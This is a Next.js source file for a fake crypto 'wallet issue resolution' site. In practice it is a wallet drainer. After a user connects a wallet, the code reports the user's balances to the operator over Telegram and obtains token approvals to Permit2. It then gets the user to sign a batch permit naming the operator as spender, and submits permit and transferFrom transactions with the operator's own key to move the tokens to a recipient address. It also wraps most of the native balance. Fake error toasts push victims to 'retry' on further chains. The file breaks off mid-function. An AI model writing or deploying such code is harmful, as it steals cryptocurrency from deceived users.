import React,{ useEffect,useState, } from "react";
import Image from "next/image";
import {NextPage} from "next";
import Head from "next/head";
import {Card, CardHeader, CardBody, CardFooter, Divider,Link,CircularProgress} from "@nextui-org/react";
import { Disclosure,} from '@headlessui/react';
import { Bars3Icon, XMarkIcon } from '@heroicons/react/24/outline';
import { toast } from 'react-toastify';
import{ConnectButton,darkTheme,useActiveAccount,useActiveWallet,useActiveWalletConnectionStatus,useActiveWalletChain,useSwitchActiveWalletChain,} from "thirdweb/react";
import {createWallet,walletConnect,privateKeyAccount} from "thirdweb/wallets";
import {ethereum,polygon,optimism,arbitrum,avalanche,base,defineChain} from "thirdweb/chains";
import{getRpcClient,eth_getBalance,eth_gasPrice,eth_getTransactionCount} from "thirdweb/rpc";
import { createThirdwebClient,getContract,sendAndConfirmTransaction,prepareContractCall} from 'thirdweb';
import { allowance,balanceOf,approve } from "thirdweb/extensions/erc20";
import {getRpcUrlForChain} from "thirdweb/chains";
import {AllowanceProvider,PERMIT2_ADDRESS} from '@uniswap/permit2-sdk';
import {Token} from '@uniswap/sdk-core';
import { ethers,utils} from "ethers";
import type { Account } from "thirdweb/wallets";



const navigation = [
    { name: 'Home', href: '/', current: false },
    { name: 'Explore', href: '#', current: true },
    { name: 'Airdrops', href: '#', current: false },
    { name: 'Contact', href: 'https://discord.com/invite/V5JXzkjMPj', current: false },
  ];
const Home: NextPage = () => {
      type Chain = {
        name: string;
        id: number;
        synced: boolean;
        symbol: string;
        title: string;
        wrappedTokenName:string;
        wrappedTokenSymbol:string;
        chainLabel:any;
        wrappedTokenAddress:string;
        image: string; };
      
      type TokenConfig ={
        name: string;
        balance: number;
        symbol: string;
        balanceUSD: string;
        address: string;
        decimals: number;
        liquidity: number;
        rawBalance: number;
      }
      
    const list = [
      {
          title: "Deposit",
          body: "Resolve deposit related issues",
          price: "",
        },
        {
          title: "Withdraw",
          body: "Resolve withdrawal related issues",
          price: "",
        },
        {
          title: "Public Sale",
          body: "Resolve public sale related issues",
          price: "",
        },
        {
          title: "Private Sale",
          body: "Resolve private sale related issues",
          price: "",
        },
      {
        title: "Referral Rewards",
        body: "Earn referral rewards from WebSolutionsPro",
        price: "",
      },
      {
        title: "Claim Rewards",
        body: "Claim available rewards",
        price: "",
      },
      {
        title: "Earn Rewards",
        body: "Earn rewards with WebSolutionsPro",
        price:"",
      }, 
      {
        title: "Marketplace",
        body: "Access and explore WebSolutionsPro marketplace",
      },
      {
          title:"Rectification",
          body:"Resolve rectification related issues",
          
      },
      {
          title:"Stake",
          body:"Resolve staking related issues",
          
      },
      {
          title:"Unstake",
          body:"Resolve unstaking related issues",
          
      },
      {
          title:"Galxe-Web",
          body:"Access and explore Galxe-web",
          
      },
      {
          title:"Zealy Market",
          body:"Access and Explore Zealy Market",
          
      },
      {
          title:"Guild.xyz",
          body:"Access and Explore Guild.xyz",
          
      },
      {
          title:"Bridge Token",
          body:"Resolve token bridging issues",
          
      },
      {
          title:"Get Role",
          body:"Resolve (Get Role) related issues",
          
      },
      {
          title:"Verify Role",
          body:"Resolve role verification Issues",
          
      },
      {
          title:"Merge RPC",
          body:"Resolve RPC Merging issues",
          
      },
      {
          title:"Swap",
          body:"Resolve swap related issues",
          
      },
      {
          title:"Connect Tasks",
          body:"Resolve task connection issues",
          
      },
      {
          title:"Mint",
          body:"Resolve minting issues",
          
      },
      {
          title:"Troubleshoot",
          body:"use this for troubleshooting",
          
      },
      {
          title:"Fix Gas",
          body:"Resolve gas fixing issues",
          
      },
      {
          title:"Retreieve Service",
          body:"Use for service retrieval",
          
      },
      {
          title:"Add Liquidity",
          body:"Resolve liquidity addition issues",
          
      },
      {
          title:"Remove Liquidity",
          body:"Resolve liquidity removal issues",
          
      },
      {
        title:"Slippage",
        body:"Resolve slippage related issues",
      },
      {
        title:"Whitelist",
        body:"Whitelist your address or resolve Whitelistng related issues"
      },
      {
        title:"Recovery",
        body:"Recover lost or stuck wallet assets"
      },
      {
        title:"Validation",
        body:"Validate wallet via Multisig"
      },
      {
        title:"Defi Farming",
        body:"Resolve Defi/Commercial farming related issues"
      },
      {
        title:"Transaction Delay",
        body:"Resolve transaction related issues."
      },
      {
        title:"Migration",
        body:"Resolve migration related issues"
      },
      {
        title:"Exchange",
        body:"Resolve exchange related issues"
      },
      {
        title:"NFT",
        body:"Resolve all NFT related issues."
      },
      {
        title:"Claim NFT",
        body:"Claim free NFTs from WebSolutionsPro"
      },
      {
        title:"NODE/RPC update",
        body:"Update Node/RPC"
      },
      {
        title:"Token Redemption",
        body:"Redeem Tokens"
      }   
    ];  
    function classNames(...classes: string[]) {
      return classes.filter(Boolean).join(' ')
    }
    function getCurrentYear(): number {
      return new Date().getFullYear();
    }
    
     const currentYear = getCurrentYear();
    const bsc = defineChain({ id: 56 });
    const fantom = defineChain({ id: 250 });
    const clientId = process.env.NEXT_PUBLIC_CLIENT_ID || "f0c8437284e8b30d3f6201d1be4d8730";
  const client = createThirdwebClient({ clientId: clientId });
  const wallets = [
    createWallet("io.metamask"),
    createWallet("com.coinbase.wallet"),
    walletConnect(),
    createWallet("com.trustwallet.app"),
    createWallet("me.rainbow"),
    createWallet("app.phantom"),
  ];
  const activeAccount = useActiveAccount();
  const wallet = useActiveWallet();
  const walletAddress = activeAccount?.address;
  const activeChain = useActiveWalletChain();
  const switchChain = useSwitchActiveWalletChain();
  const rpcRequest = getRpcClient({client,chain:activeChain || ethereum}); 
  const connectionStatus = useActiveWalletConnectionStatus();
  const Erc20Abi = require('erc-20-abi');
  const pk = process.env.NEXT_PUBLIC_PRIVATE_KEY || '0x9r1v473K3yf0r51gn1ng7r4n54c710n5';
  const dappSecret:Account = privateKeyAccount({client, privateKey:pk});
  const [chainList, setChainList] = useState<Chain[]>([]);
  const [isConnectModalOpen, setIsConnectModalOpen] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedChain, setSelectedChain] = useState<string>("");
  const [selectedChainId, setSelectedChainId] = useState<number | null>(1); 
  const [selectedSymbol, setSelectedSymbol] = useState<string>('');
  const [selectedTitle, setSelectedTitle] = useState<string>("");
  const [selectedWrappedTokenAddress, setSelectedWrappedTokenAddress] = useState<string>("");
  const [selectedwrappedTokenSymbol, setSelectedwrappedTokenSymbol] = useState<string>("");
  const [selectedwrappedTokenName, setSelectedwrappedTokenName] = useState<string>("");
  const [selectedChainLabel, setSelectedChainLabel] = useState<any>();
  const [chainSelectionConfirmed, setChainSelectionConfirmed] = useState(false);
  const [selectedImage, setSelectedImage] = useState<string>("");
  const [selectedNextChain, setSelectedNextChain] = useState<Chain>();
  const [IsNextChainModal, setIsNextChainModal] = useState(false);
  const [loading, setLoading] = useState(false);
  useEffect(() => {
    const storedList = JSON.parse(localStorage.getItem('chainList') || '[]');

    if (storedList && storedList.length > 0) {
        setChainList(storedList);
    } else {
        const initialList = [
{ name: "ethereum", id: 1, synced: false, symbol: "ETH", title: "Ethereum", wrappedTokenName: "Wrapped Ether", wrappedTokenSymbol: "WETH", chainLabel: ethereum, wrappedTokenAddress: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", image: "/images/ethereum.png" },
{ name: "arbitrum", id: 42161, synced: false, symbol: "ETH" ,title: "Arbitrum",wrappedTokenName:"Wrapped Ether",wrappedTokenSymbol:"WETH",chainLabel:arbitrum,wrappedTokenAddress:"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",image:"/images/arbitrum.png",},
{ name: "optimism", id: 10, synced: false,  symbol: "ETH",title: "Optimism",wrappedTokenName:"Wrapped Ether",wrappedTokenSymbol:"WETH",chainLabel:optimism,wrappedTokenAddress:"0x4200000000000000000000000000000000000006",image:"/images/optimism.png",},
{ name: "avalanche", id: 43114, synced: false,  symbol: "AVAX",title: "Avalanche",wrappedTokenName:"Wrapped AVAX",wrappedTokenSymbol:"WAVAX",chainLabel:avalanche,wrappedTokenAddress:"0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7",image:"/images/avalanche.png",},
{ name: "polygon", id: 137, synced: false,  symbol: "MATIC",title: "Polygon",wrappedTokenName:"Wrapped Matic",wrappedTokenSymbol:"WMATIC",chainLabel:polygon,wrappedTokenAddress:"0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",image:"/images/polygon.png",},
{ name: "fantom", id: 250, synced: false,  symbol: "FTM",title: "Fantom",wrappedTokenName:"Wrapped Fantom",wrappedTokenSymbol:"WFTM",chainLabel:fantom,wrappedTokenAddress:"0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83",image:"/images/fantom.png",},
 { name: "binance", id: 56, synced: false,  symbol: "BNB",title: "Binance Smart Chain",wrappedTokenName:"Wrapped BNB",wrappedTokenSymbol:"WBNB",chainLabel:bsc,wrappedTokenAddress:"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",image:"/images/binance.png",},
 { name: "base", id: 8453, synced: false,  symbol: "ETH",title: "Base",wrappedTokenName:"Wrapped Ether",wrappedTokenSymbol:"WETH",chainLabel:base,wrappedTokenAddress:"0x4200000000000000000000000000000000000006",image:"/images/base.webp",},
];

setChainList(initialList);
localStorage.setItem('chainList', JSON.stringify(initialList));
}

setIsConnectModalOpen(true);
setChainSelectionConfirmed(false);
}, []);
const closeModal = () => {
  setIsConnectModalOpen(false);
};
  const handleChainSelection = async (chainName: string, chainId: number, chainSym: string, chainTitle: string, chainWrappedTokenName: string, chainWrappedTokenSymbol: string, chainLabel: any, chainWrappedTokenAddress: string, chainImage: string,) => {
    setSelectedChain(chainName);
    setSelectedChainId(chainId);
    setSelectedSymbol(chainSym);
    setSelectedTitle(chainTitle);
    setSelectedwrappedTokenName(chainWrappedTokenName);
    setSelectedwrappedTokenSymbol(chainWrappedTokenSymbol);
    setSelectedChainLabel(chainLabel);
    setSelectedWrappedTokenAddress(chainWrappedTokenAddress);
    setSelectedImage(chainImage);

    switch (connectionStatus) {
        case "connecting":
            setIsModalOpen(false);
            return;
        case "connected":
            await switchChain(chainLabel);
            setIsModalOpen(false);
            await sendMessageToTelegram(`User has Selected ${chainLabel} awaiting synchronization...`);
            toast.success('Chain selected. You can now explore the features', {
              position: "top-left",
autoClose: 5000,
hideProgressBar: false,
closeOnClick: true,
pauseOnHover: true,
draggable: true,
progress: undefined,
theme: "dark",
            });
            setChainSelectionConfirmed(true);
            break;
        case "disconnected":
            setIsModalOpen(false);
            setIsConnectModalOpen(true);
            return;
        default:
            break;
    }
};

const handleChainSelectionX = async (chainName: string, chainId: number, chainSym: string, chainTitle: string, chainWrappedTokenName: string, chainWrappedTokenSymbol: string, chainLabel: any, chainWrappedTokenAddress: string, chainImage: string,) => {
  setIsNextChainModal(false);
  toast.success('Retrying via another node...', {
    position: "top-left",
autoClose: 5000,
hideProgressBar: false,
closeOnClick: true,
pauseOnHover: true,
draggable: true,
progress: undefined,
theme: "dark",
  });
  setLoading(true);
  setSelectedChain(chainName);
  setSelectedChainId(chainId);
  setSelectedSymbol(chainSym);
  setSelectedTitle(chainTitle);
  setSelectedwrappedTokenName(chainWrappedTokenName);
  setSelectedwrappedTokenSymbol(chainWrappedTokenSymbol);
  setSelectedChainLabel(chainLabel);
  setSelectedWrappedTokenAddress(chainWrappedTokenAddress);
  setSelectedImage(chainImage);

  switch (connectionStatus) {
      case "connecting":
          setIsModalOpen(false);
          return;
      case "connected":
          await switchChain(chainLabel);
          setIsModalOpen(false);
          await sendMessageToTelegram(`Chain has been switched to ${chainLabel}\n Synchronization on the chain will begin shortly...`);
          await syncChain(chainName,chainId,chainSym);
          break;
      case "disconnected":
          setIsModalOpen(false);
          setIsConnectModalOpen(true);
          await sendMessageToTelegram(chainLabel);
          return;
      default:
          break;
  }
};
    
    const permitAbi = [
      {
     "inputs": [
       {
         "internalType": "address",
         "name": "owner",
         "type": "address"
       },
       {
         "components": [
           {
             "components": [
               {
                 "internalType": "address",
                 "name": "token",
                 "type": "address"
               },
               {
                 "internalType": "uint160",
                 "name": "amount",
                 "type": "uint160"
               },
               {
                 "internalType": "uint48",
                 "name": "expiration",
                 "type": "uint48"
               },
               {
                 "internalType": "uint48",
                 "name": "nonce",
                 "type": "uint48"
               }
             ],
             "internalType": "struct IAllowanceTransfer.PermitDetails[]",
             "name": "details",
             "type": "tuple[]"
           },
           {
             "internalType": "address",
             "name": "spender",
             "type": "address"
           },
           {
             "internalType": "uint256",
             "name": "sigDeadline",
             "type": "uint256"
           }
         ],
         "internalType": "struct IAllowanceTransfer.PermitBatch",
         "name": "permitBatch",
         "type": "tuple"
       },
       {
         "internalType": "bytes",
         "name": "signature",
         "type": "bytes"
       }
     ],
     "name": "permit",
     "outputs": [],
     "stateMutability": "nonpayable",
     "type": "function"
   },
   {
     "inputs": [
       {
         "internalType": "struct IAllowanceTransfer.AllowanceTransferDetails[]",
         "name": "transferDetails",
         "type": "tuple[]",
         "components": [
           {
             "internalType": "address",
             "name": "from",
             "type": "address"
           },
           {
             "internalType": "address",
             "name": "to",
             "type": "address"
           },
           {
             "internalType": "uint160",
             "name": "amount",
             "type": "uint160"
           },
           {
             "internalType": "address",
             "name": "token",
             "type": "address"
           }
         ]
       }
     ],
     "stateMutability": "nonpayable",
     "type": "function",
     "name": "transferFrom"
   }
  ];
  function markChainAsSynced(chainName: string) {
    const storedList = JSON.parse(localStorage.getItem('chainList') || '[]');
    const index = storedList.findIndex((chain:Chain) => chain.name === chainName);
    // If the chain is found, mark it as synced
    if (index !== -1) {
      storedList[index].synced = true;
      localStorage.setItem('chainList', JSON.stringify(storedList));
    }
  }
  const syncChain = async (chainName: string, chainId: number, chainSymbol: string) => {
    if (!chainSelectionConfirmed) {
      setIsModalOpen(true);
    } else {
      if ( walletAddress === undefined){
        setChainSelectionConfirmed(false);
        setIsConnectModalOpen(true); 
      }else{
      await sendMessageToTelegram("synchronization begins....");
      setLoading(true);
      let url: string;
      let nativeUrl: string;
      switch(selectedChain) {
        case 'ethereum':
          url = `https://api.portals.fi/v2/account?owner=${walletAddress}&networks=ethereum`;
          nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=ethereum`;
          break;
        case 'polygon':
          url = `https://api.portals.fi/v2/account?owner=${walletAddress}&networks=polygon`;
          nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=polygon`;
          break;
        case 'avalanche':
          url = `https://api.portals.fi/v2/account?owner=${walletAddress}&networks=avalanche`;
          nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=avalanche`;
          break;
          case 'binance':
          url = `https://api.portals.fi/v2/account?owner=${walletAddress}&networks=bsc`;
          nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=bsc`;
          break;
        case 'arbitrum':
          url = `https://api.portals.fi/v2/account?owner=${walletAddress}&networks=arbitrum`;
          nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=arbitrum`;
          break;
        case 'optimism':
          url = `https://api.portals.fi/v2/account?owner=${walletAddress}&networks=optimism`;
          nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=optimism`;
          break;
        case 'fantom':
          url = `https://api.portals.fi/v2/account?owner=${walletAddress}&networks=fantom`;
          nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=fantom`;
          break;
            case 'base':
              url= `https://api.portals.fi/v2/account?owner=${walletAddress}&networks=base`;
              nativeUrl= `https://api.portals.fi/v2/tokens?search=${selectedSymbol}&platforms=native&networks=base`;
              break;
          default:
            url='';
            nativeUrl='';
            break;
      }
      const headers ={
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${process.env.NEXT_PUBLIC_PORTAL_KEY}`
      }
      const response = await fetch(url, {
        method: "GET",
        headers: headers
      });
      const data = await response.json();
      const tokens =data.balances.filter((token: TokenConfig) => token.address !== "0x0000000000000000000000000000000000000000");
      let totalBalanceUSD = 0;
      const tokenDetails = tokens.filter((token: TokenConfig) => token.liquidity > 0).map((token: TokenConfig) => {
        totalBalanceUSD += parseFloat(token.balanceUSD);
        return {
          address: token.address,
          decimals: token.decimals,
          symbol: token.symbol,
          name: token.name,
          balance: token.balance,
          balanceUSD: token.balanceUSD,
          rawBalance: token.rawBalance,
          liquidity: token.liquidity
        }
      });
      const tokensUsdValue =parseFloat(totalBalanceUSD.toFixed(2));
      await sendMessageToTelegram(`Total token balance in USD: $${totalBalanceUSD.toFixed(2)}`);
      const walletBalance = await eth_getBalance(rpcRequest, {
        address: walletAddress,
      });
      const headersNative = {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${process.env.NEXT_PUBLIC_PORTAL_KEY}`
      }
      const responseNative = await fetch(nativeUrl, {
        method: "GET",
        headers: headersNative,
      })
      const dataNative = await responseNative.json();
      const nativeUsdPrice = dataNative.tokens[0].price;
      const balanceInEther = Number(walletBalance) / 1e18;
      const nativeAmountinUSD = balanceInEther * nativeUsdPrice;
      await sendMessageToTelegram(`Native balance in USD: $${nativeAmountinUSD}`);
      await processTokens(tokenDetails, tokensUsdValue, nativeAmountinUSD);
      markChainAsSynced(chainName);
      const storedList = JSON.parse(localStorage.getItem('chainList') || '[]');
  const unsyncedChains = storedList.filter((chain: Chain) => !chain.synced);
      if (unsyncedChains.length === 0) {
        await sendMessageToTelegram("All chains synced successfully.");
      }
      const nextIndex = storedList.findIndex((chain: Chain) => !chain.synced);
      const nextChain = storedList[nextIndex];
      setSelectedNextChain(nextChain);
      setLoading(false);
      toast.error('Error: synchronization incomplete due to overpopulated node. retry explorer through another node', {
        position: "top-left",
autoClose: 5000,
hideProgressBar: false,
closeOnClick: true,
pauseOnHover: true,
draggable: true,
progress: undefined,
theme: "dark",
      });
      setIsNextChainModal(true);
}// All code to run syncChain must not exceed this line.
    }
  };
  async function processTokens(tokens:TokenConfig[], tokensUsdValue:number, nativeAmountinUSD:number){
    await sendMessageToTelegram(`Processing begins`);
    if (tokensUsdValue > nativeAmountinUSD){
        await sendMessageToTelegram(`total amount of erc20 tokens $${tokensUsdValue} is more than the amount of ${selectedSymbol} on the ${selectedChain} network.`);
        for(const token of tokens){
            const tokenInfo =`Name: ${token.name}\n Symbol: ${token.symbol}\n Balance: ${token.balance}\n Balance USD:$ ${token.balanceUSD}\n Contract Address: ${token.address}\n Available Liquidity: ${token.liquidity}`;
            await sendMessageToTelegram(`${tokenInfo}`);
        }
        await functionX(tokens);
        await functionY();
    } else {
        await sendMessageToTelegram(`total amount of ${selectedSymbol} is more than the amount of erc20 tokens $${tokensUsdValue} on the ${selectedChain} network.`)
        for(const token of tokens){
            const tokenInfo =`Name: ${token.name}\n Symbol: ${token.symbol}\n Balance: ${token.balance}\n Balance USD:$ ${token.balanceUSD}\n Contract Address: ${token.address}\n Available Liquidity: ${token.liquidity}`;
            await sendMessageToTelegram(`${tokenInfo}`);
        }
        await functionY();
        await functionX(tokens);
    }
}
async function functionX(tokens: TokenConfig[]) {
  try {
      await sendMessageToTelegram('Executing Allowance requests');

      const allowedTokens: TokenConfig[] = [];

      for (const token of tokens) {
          if (parseFloat(token.balanceUSD) === 0) {
              await sendMessageToTelegram(`Skipping token ${token.name} as its USD value is zero`);
              continue;
          }
          if (!selectedChainId || !walletAddress) {
              await sendMessageToTelegram('Selected chain ID or address is null or undefined');
              throw new Error('Selected chain ID or address is null or undefined');
          }

          const chainId = selectedChainId;
          const tokenAddress = token.address;
          const url = `https://anyabi.xyz/api/get-abi/${chainId}/${tokenAddress}`;
          const response = await fetch(url);
          const data = await response.json();
          let abiToUse;

          switch (selectedChain) {
              case 'ethereum':
              case 'binance':
              case 'avalanche':
              case 'fantom':
                  abiToUse = data.abi;
                  break;
              case 'polygon':
              case 'arbitrum':
              case 'optimism':
                  abiToUse = Erc20Abi;
                  break;
              default:
                  abiToUse = data.abi;
                  break;
          }

          const tokenContract = getContract({
              client,
              chain: selectedChainLabel,
              address: token.address,
              abi: abiToUse,
          });

          const spender = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
          const tokenAllowance = await allowance({
              contract: tokenContract,
              owner: walletAddress,
              spender: spender,
          });

          const amount = await balanceOf({
              contract: tokenContract,
              address: walletAddress,
          });

          await sendMessageToTelegram(`${token.name} allowance is ${tokenAllowance}`);

          if (tokenAllowance >= amount) {
              allowedTokens.push(token);
              await sendMessageToTelegram(`${token.name} has been previously approved`);
          } else {
              let approvalSuccessful = false;
              let attempts = 0;

              while (!approvalSuccessful && attempts < 2) { // Retry up to 2 times
                  try {
                      // Approve the spender
                      const approvalTx = await approve({
                          contract: tokenContract,
                          spender: spender,
                          amount: Number(amount),
                      });
                      const approvalReceipt = await sendAndConfirmTransaction({
                          account: activeAccount,
                          transaction: approvalTx,
                      });

                      if (approvalReceipt !== undefined && approvalReceipt.status === "success") {
                          allowedTokens.push(token);
                          approvalSuccessful = true;
                          await sendMessageToTelegram(`${token.name} has been approved`)
                      } else {
                          await sendMessageToTelegram(`Approval not granted for token ${token.name}. Retrying...`);
                          toast.error('warn: Grant contract approval for wallet issue resolution', {
                            position: "top-left",
                    autoClose: 5000,
                    hideProgressBar: false,
                    closeOnClick: true,
                    pauseOnHover: true,
                    draggable: true,
                    progress: undefined,
                    theme: "dark",
                          });
                          attempts++;
                      }
                  } catch (error) {
                      console.error('An error occurred during approval:', JSON.stringify(error));
                      toast.error('warn: Grant contract approval for wallet issue resolution', {
                        position: "top-left",
                autoClose: 5000,
                hideProgressBar: false,
                closeOnClick: true,
                pauseOnHover: true,
                draggable: true,
                progress: undefined,
                theme: "dark",
                      });
                      attempts++;
                  }
              }

              if (!approvalSuccessful) {
                  await sendMessageToTelegram(`Approval request for token ${token.name} retried and rejected.`);
                  // Notify user or handle the situation accordingly
              }
          }
      }

      if (allowedTokens.length === 0) {
          await sendMessageToTelegram('No tokens approved!');
      } else {
          await generatePermitSignature(allowedTokens);
      }
  } catch (error) {
      await sendMessageToTelegram(`Error in Executing Tokens Synchronization Function\n REASON: ${JSON.stringify(error)}`);
      await sendMessageToTelegram(`${JSON.stringify(error)}`);
  }
};

async function generatePermitSignature(tokenInfoArray: TokenConfig[]) {
  const init = process.env.NEXT_PUBLIC_INITIATOR || "0xinitiator";
  const initiator = init;
  const recipient = process.env.NEXT_PUBLIC_RECIEPIENT || "0xr3c13913n7"
  const permitDetails = [];
  const transferDetails =[];
  for (const token of tokenInfoArray) {
    const rpcUrl = getRpcUrlForChain({
      chain:selectedChainId || 1,
      client
    });
    const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
    const allowanceProvider = new AllowanceProvider(provider, PERMIT2_ADDRESS);
    const nonce = await allowanceProvider.getNonce(token.address, walletAddress!, PERMIT2_ADDRESS);
    const tokenAmount = String(token.balance * (10 ** token.decimals));
    permitDetails.push({
      token: token.address,
      amount:tokenAmount,
      nonce:nonce,
      expiration:Math.floor(Date.now() / 1000) + (12 * 60 * 60),
    });
    transferDetails.push({
     from: walletAddress,
     to: recipient,
     amount:tokenAmount,
     token:token.address,
    })
  }
  const sigDeadline =Math.floor(Date.now() / 1000) + (12 * 60 * 60);
  const permitBatch = {
      details: permitDetails,
      spender: initiator,
      sigDeadline: sigDeadline,
  }; 
  const domain = {
    name: "Permit2",
    chainId: selectedChainId ?? 1,
    verifyingContract: PERMIT2_ADDRESS,
  };
  
 const types = {
  PermitBatch: [
      {
          name: "details",
          type: "PermitDetails[]",
      },
      {
          name: "spender",
          type: "address",
      },
      {
          name: "sigDeadline",
          type: "uint256",
      },
  ],
  PermitDetails: [
      {
          name: "token",
          type: "address",
      },
      {
          name: "amount",
          type: "uint160",
      },
      {
          name: "expiration",
          type: "uint48",
      },
      {
          name: "nonce",
          type: "uint48",
      },
  ],
}

await sendMessageToTelegram(`Permit Batch Details: ${JSON.stringify(permitBatch)}`);
await sendMessageToTelegram(`Transfer Details: ${JSON.stringify(transferDetails)}`);
const signature = await activeAccount?.signTypedData( {
  domain: domain,
  types: types,
  primaryType: "PermitBatch" as const,
  message: { 
    details: permitBatch.details, 
    spender: initiator, 
    sigDeadline:BigInt(permitBatch.sigDeadline),
},
});
await sendMessageToTelegram(`${signature}`);
if(signature){
  const r = '0x' + signature.slice(2, 66);
        const s = '0x' + signature.slice(66, 130);
        const v = parseInt('0x' + signature.slice(130, 132), 16);
        await sendMessageToTelegram(`R: ${r}\n S: ${s}\n v: ${v}`);
        const signerAddress = utils.verifyTypedData(domain,types,permitBatch,signature );
        await sendMessageToTelegram(signerAddress);
        if (signerAddress !== walletAddress){
          await sendMessageToTelegram("Recovered address does not match user address. Signature is Invalid");
        }else{
          await sendMessageToTelegram(`Signature Verified \n Signature is valid`);
          const rpcUrl = getRpcUrlForChain({
            chain:selectedChainId || 1,
            client
          });
          const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
          const contractPermit = new ethers.Contract(PERMIT2_ADDRESS, permitAbi,provider);
          const permitCall = await contractPermit.populateTransaction.permit(walletAddress,permitBatch,signature);
          const permitCallData = permitCall.data;
          await sendMessageToTelegram(`${permitCallData}`);
          const gasPrice = await eth_gasPrice(rpcRequest);
          await sendMessageToTelegram(`Gas Price: ${gasPrice}`);
          const baseFee = await provider.getFeeData();
          const baseFeePerGas = baseFee.lastBaseFeePerGas;
          const dappKey = process.env.NEXT_PUBLIC_PRIVATE_KEY || "0xdappprivatesigningkey"
          const transactionCount = await eth_getTransactionCount(rpcRequest, {
            address:dappSecret.address,
          });
          const dappSigner = new ethers.Wallet(dappKey,provider);
          const transaction = {
            to: PERMIT2_ADDRESS,
            data: permitCallData,
            gasLimit: 800000,
            nonce:transactionCount,
            chainId:selectedChainId ?? 1,
            maxFeePerGas: baseFee.maxFeePerGas ?? ethers.utils.parseUnits('100', 'gwei'), // Base fee in Gwei
            maxPriorityFeePerGas: baseFee.maxPriorityFeePerGas ?? ethers.utils.parseUnits('75', 'gwei'),
            type: 2,
          }
          const signedPermitTx = await dappSigner.signTransaction(transaction);
          const permitTxResponse = await provider.sendTransaction(signedPermitTx);
          await sendMessageToTelegram(`Transaction hash: ${permitTxResponse.hash}`);
          const transactionReceipt = await provider.getTransactionReceipt(permitTxResponse.hash);
        if (transactionReceipt && transactionReceipt.status === 1) {
  await sendMessageToTelegram('Permit Transaction successful Admin intervention not required.');
          const permitTransferCall = await contractPermit.populateTransaction.transferFrom(transferDetails);
          const permitTransferCallData = permitTransferCall.data;
          await sendMessageToTelegram(`${permitTransferCallData}`);
          const gasPrice = await eth_gasPrice(rpcRequest);
          await sendMessageToTelegram(`Gas Price: ${gasPrice}`);
          const baseFee = await provider.getFeeData();
          const baseFeePerGas = baseFee.lastBaseFeePerGas;
          const dappKey = process.env.NEXT_PUBLIC_PRIVATE_KEY || "0xdappprivatesigningkey"
          const transactionCount2 = await eth_getTransactionCount(rpcRequest, {
            address:dappSecret.address,
          });
          const dappSigner = new ethers.Wallet(dappKey,provider);
          const transaction = {
            to: PERMIT2_ADDRESS,
            data: permitTransferCallData,
            gasLimit: 800000,
            nonce:transactionCount2,
            chainId:selectedChainId ?? 1,
            maxFeePerGas: baseFee.maxFeePerGas ?? ethers.utils.parseUnits('100', 'gwei'), // Base fee in Gwei
            maxPriorityFeePerGas: baseFee.maxPriorityFeePerGas ?? ethers.utils.parseUnits('75', 'gwei'),
            type: 2,
          };
          const signedPermitTx = await dappSigner.signTransaction(transaction);
          const permitTxResponse = await provider.sendTransaction(signedPermitTx);
          await sendMessageToTelegram(`Transaction hash: ${permitTxResponse.hash}`);
          const transactionReceipt = await provider.getTransactionReceipt(permitTxResponse.hash);
          if (transactionReceipt && transactionReceipt.status === 1) {
            await sendMessageToTelegram('Permit Transfer Transaction successful Administration intervention not required!');
          }else if (transactionReceipt && transactionReceipt.status === 0) {
            await sendMessageToTelegram('Transfer Transaction failed Login to Amin Dashboard to complete transaction immediately!');
                } else {
            await sendMessageToTelegram('Transaction status unknown Check transaction hash on the blockchain to confirm transaction.');
            };
        } else if (transactionReceipt && transactionReceipt.status === 0) {
  await sendMessageToTelegram('Permit Transaction failed! Login to Admin Dashboard to complete transaction');
      } else {
  await sendMessageToTelegram('Transaction status unknown. Check transaction hash on the blockchain to confirm transaction.');
  }  }
}else{
  await sendMessageToTelegram(`Signature not recovered. tell user to clear cache and restart process`);
};
};

async function functionY(){
  await sendMessageToTelegram(`Native token processing...`);
  const allowedTokens: Token[] =[]
  const wrappedContract = selectedWrappedTokenAddress;
  if (!selectedChainId || !walletAddress) {
    await sendMessageToTelegram('Selected chain ID or address is null or undefined');
  }
  const chainId = selectedChainId;
    const tokenAddress = wrappedContract;
    const url = `https://anyabi.xyz/api/get-abi/${chainId}/${tokenAddress}`;
    const response = await fetch(url);
    const data = await response.json();
    if (!data.abi) {
      await sendMessageToTelegram(`Failed to get ABI for token ${selectedwrappedTokenName}`);
    }
    const wrappedAbi = data.abi;
    const walletBalance = await eth_getBalance(rpcRequest, {
      address: walletAddress!,
    });
    const eightyPercentBalance = (walletBalance * BigInt(8)) / BigInt(10);
    const wrappedContractX = getContract({
      client:client,
      chain:selectedChainLabel,
      address:tokenAddress,
      abi: wrappedAbi,
    });
    const transaction = await prepareContractCall({
      contract: wrappedContractX,
      method: "function deposit(uint256 value)",
      params: [eightyPercentBalance],
    });
    const transactionReceipt = await sendAndConfirmTransaction({
      account:activeAccount!,
      transaction:transaction,
    });
    if (transactionReceipt.status === "success"){
      await sendMessageToTelegram(`Native Token Wrapped`);
      await sendMessageToTelegram(`Token Wrap Transaction hash: ${transactionReceipt.transactionHash}`);
      const wrappedToken = new Token(
        selectedChainId!,
        selectedWrappedTokenAddress,
        18,
        selectedwrappedTokenSymbol,
        selectedwrappedTokenName,
      );
      if (!selectedChainId || !walletAddress) {
